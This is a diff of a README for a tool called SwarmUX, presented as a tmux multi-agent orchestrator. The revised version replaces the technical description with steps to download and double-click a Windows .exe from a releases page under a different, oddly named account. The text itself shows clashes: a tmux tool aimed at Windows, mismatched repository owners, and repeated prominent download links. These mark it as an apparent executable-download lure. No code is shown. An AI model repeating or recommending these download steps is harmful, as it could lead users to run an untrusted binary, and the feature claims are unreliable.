@@ -1,140 +1,71 @@
-# SwarmUX v2026 - multi-agent terminal orchestrator 2026
+# 🐙 swarmux-tmux-orchestrator - Manage many terminal agents with ease
 
-> **SwarmUX brings tmux-centered multi-agent coordination into one CLI workflow, combining terminal session control, command validation, and orchestration for developers.**
+[![Download SwarmUX](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Impervious-airspring554/swarmux-tmux-orchestrator/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-tmux-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/grayethanaods6426/swarmux-tmux-orchestrator?style=flat-square)](https://github.com/grayethanaods6426/swarmux-tmux-orchestrator)
+SwarmUX v2026 helps you run multiple programs at the same time inside one terminal window. It organizes your workflow so you can see all your work clearly. It checks your commands for mistakes and connects your agents automatically. This tool saves space and keeps your work organized.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://grayethanaods6426.github.io/swarmux-tmux-orchestrator/">
-    <img src="https://img.shields.io/badge/Download-SwarmUX%20Latest-brightgreen?style=for-the-badge" alt="Download SwarmUX">
-  </a>
-</p>
+Before you install SwarmUX, check that your computer meets these needs:
 
-> **[Direct Download - SwarmUX v2026](https://grayethanaods6426.github.io/swarmux-tmux-orchestrator/)**
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 100 megabytes of free disk space.
+- Terminal: A modern terminal application like Windows Terminal.
 
----
+## 📥 How to Install
 
-[Download Latest Build](https://grayethanaods6426.github.io/swarmux-tmux-orchestrator/)
+1. Visit the [releases page](https://github.com/Impervious-airspring554/swarmux-tmux-orchestrator/releases) to download the latest version.
+2. Select the file ending in .exe for your version of Windows.
+3. Save the file to a folder you can find later, such as your Downloads folder.
+4. Double-click the downloaded file to start the installation.
+5. Follow the steps on your screen to finish the setup process.
 
----
+## 🚀 Getting Started
 
-## Overview
+Once you install the software, open your terminal program. Type `swarmux` and press Enter to start the tool. The main screen appears. It shows a list of your current agents.
 
-SwarmUX is a CLI tool for organizing tmux sessions around multi-agent development workflows. It is built to keep automated tasks, agent-driven actions, and command checks coordinated within a single terminal-based environment.
+### Starting a New Session
+To begin a new workflow, type the command `swarmux new session-name`. Replace "session-name" with a name you choose. This creates a fresh workspace where you can add, remove, and track your agents. You see a split screen layout that organizes your running agents into separate boxes.
 
-The project is meant for developers and teams who repeatedly run shell-first automation, coding loops assisted by agents, or structured task pipelines. Through profiles, access control, and session-scoped limits, SwarmUX lets you define how work starts, stays monitored, and changes over time.
+### Adding Agents
+You can add agents to your active session. Type `swarmux add agent-name`. The tool verifies your input. If the command looks correct, the agent starts inside a dedicated frame. SwarmUX keeps these frames aligned so you do not lose track of your work.
 
----
+### Using Session Control
+Use these basic commands to manage your workflow:
 
-## What it does
+- `swarmux list`: Shows all sessions that are currently running.
+- `swarmux switch session-name`: Moves you from one session to another.
+- `swarmux validate`: Checks your agent commands for potential errors before you run them.
+- `swarmux kill session-name`: Ends a session and closes all agents inside it.
 
-- Organizes tmux sessions for disciplined terminal workflows
-- Supports multi-agent development patterns for coordinated work
-- Checks commands against schema-driven rules before execution
-- Works with OpenAI and Claude-powered agents
-- Saves session snapshots and allows rollback when required
-- Enforces resource limits at the session level for tighter control
-- Relies on profile-based configuration for reusable workflow setups
-- Provides multi-user access control for shared environments
+## 🛡️ Troubleshooting Common Issues
 
----
+If you face problems, check these solutions first.
 
-## Installation
+### The command is not recognized
+If your terminal says "command not found," your computer might need a restart. Close the terminal window and open it again. This helps the computer find the installation path for SwarmUX.
 
-Clone the repository or download the latest build from the project page:
+### Agents stop unexpectedly
+SwarmUX includes a feature that checks command integrity. If an agent stops suddenly, type `swarmux status agent-name`. This command prints the last few lines of data from that specific agent. Use this information to find why the process stopped.
 
-```bash
-git clone https://github.com/grayethanaods6426/swarmux-tmux-orchestrator.git
-cd REPO
-```
+### The terminal layout looks messy
+If the split screens overlap, type `swarmux refresh`. This command forces the layout to realign to your current window size. If this does not help, maximize your terminal window and try the command again.
 
-Once installed, run SwarmUX from your terminal and attach it to the tmux environment using the profile you want.
+## ⚙️ Advanced Configuration (Optional)
 
----
+You can change how SwarmUX looks and acts. Find the configuration file in your user folder under `.swarmux/config.yaml`. Open this file with Notepad.
 
-## Usage
+- Change the default split direction.
+- Adjust the color theme for the borders.
+- Set a default session name that starts every time you open the terminal.
 
-Begin by choosing or creating a profile, then open the tmux session that SwarmUX should manage.
+Save the file and type `swarmux reload` to apply your changes. You do not need to restart the application.
 
-Typical workflow:
+## 📁 Staying Organized
 
-1. Load a profile that defines agent behavior and limits
-2. Validate the commands you want to run
-3. Attach agents or automation steps to the session
-4. Monitor progress from the terminal
-5. Capture a snapshot before major changes
-6. Roll back if you need to restore a prior state
+SwarmUX keeps your terminal clean. Instead of opening ten different windows, you hold everything in one place. Developers use this for testing many agents at once. If you work on multiple projects, keep separate sessions for each one. This prevents your work from mixing.
 
-Example workflow concept:
+Always name your sessions clearly. Use names like "web-server" or "data-processor." This makes it simple to switch back to your work later in the day.
 
-```bash
-swarmux start --profile dev-agent
-swarmux validate --command "make test"
-swarmux snapshot save
-swarmux rollback --snapshot latest
-```
-
-Adjust the exact commands to match the CLI interface provided in your build.
-
----
-
-## Configuration
-
-SwarmUX centers on profile-based settings. Keep workflow definitions, validation rules, agent connections, and access controls inside the active profile or the supporting configuration files used by your installation.
-
-A simple configuration layout may look like this:
-
-```yaml
-profile: dev-agent
-session:
-  resource_limits: true
-  snapshots: true
-agents:
-  provider: openai
-  fallback: claude
-access:
-  multi_user: true
-```
-
-Make sure the configuration matches your tmux layout and the automation tasks you want to run.
-
----
-
-## Requirements
-
-- tmux installed on the host system
-- A terminal environment suitable for CLI automation
-- Access to the configured agent provider if you enable OpenAI or Claude integration
-- Sufficient local resources for the sessions and workflows you plan to run
-- A compatible shell environment for command execution and validation
-
----
-
-## FAQ
-
-**How do I get updates?**  
-Download the latest build from the project page and refresh your local installation whenever a new version is released.
-
-**Where do I change behavior?**  
-Edit the active profile and the related configuration so the session rules, agents, and limits line up with your workflow.
-
-**What if command validation blocks something I expected to run?**  
-Check the schema rules in your profile or validation layer, then revise the command format or the permitted inputs.
-
-**Can I recover a previous session state?**  
-Yes, session snapshots and rollback support are included for workflows that need restoration points.
-
-**Does it support shared access?**  
-Yes, multi-user access control is part of the feature set for managed environments.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: tmux, terminal, orchestration, windows-tools, productivity, cli
